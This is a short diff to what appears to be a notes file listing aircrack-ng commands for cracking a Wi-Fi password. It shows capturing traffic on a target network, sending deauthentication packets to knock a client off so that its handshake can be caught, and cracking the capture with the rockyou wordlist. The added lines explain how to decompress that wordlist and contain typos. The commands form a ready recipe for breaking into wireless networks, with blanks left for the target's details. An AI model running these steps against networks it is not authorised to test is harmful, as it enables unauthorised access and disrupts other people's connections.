@@ -6,3 +6,5 @@ airodoump-ng wlan0
 airodump-ng --bssid ______  --channel ______ --write hacked wlan0
 aireplay-ng --deauth __ -a _______ -c ______ wlan0
 aircrack-ng hacked.01.cap -w /usr/share/wordlists/rockyou.txt
+
+(If your rockyou file is in zip mode so type:  (1) cd /usr/share/wordlists/ (2) sudo gzip -d rockyou.tzt.gz)
